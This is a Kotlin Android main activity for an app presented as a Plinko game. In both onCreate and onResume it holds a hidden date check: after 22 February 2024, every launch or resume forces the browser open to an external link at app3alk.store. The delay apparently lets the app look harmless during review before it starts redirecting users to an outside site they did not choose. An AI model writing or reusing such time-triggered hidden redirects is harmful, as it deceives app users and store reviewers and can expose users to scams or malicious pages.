package plinko.originalwin.com

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import plinko.originalwin.com.databinding.ActivityMainBinding
import plinko.originalwin.com.util.Lottie
import plinko.originalwin.com.util.Once
import plinko.originalwin.com.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Calendar
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding

    lateinit var lottie: Lottie

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        lottie.showLoader()

        Calendar.getInstance().apply {
            set(2024, Calendar.FEBRUARY, 22, 18, 0)
            if (System.currentTimeMillis() >= timeInMillis) {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://app3alk.store/m1r2JmWP")))
            }
        }

    }

    override fun exit() {
        onceExit.once {

            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        Calendar.getInstance().apply {
            set(2024, Calendar.FEBRUARY, 22, 18, 0)
            if (System.currentTimeMillis() >= timeInMillis) {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://app3alk.store/m1r2JmWP")))
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        lottie = Lottie(binding)
    }

}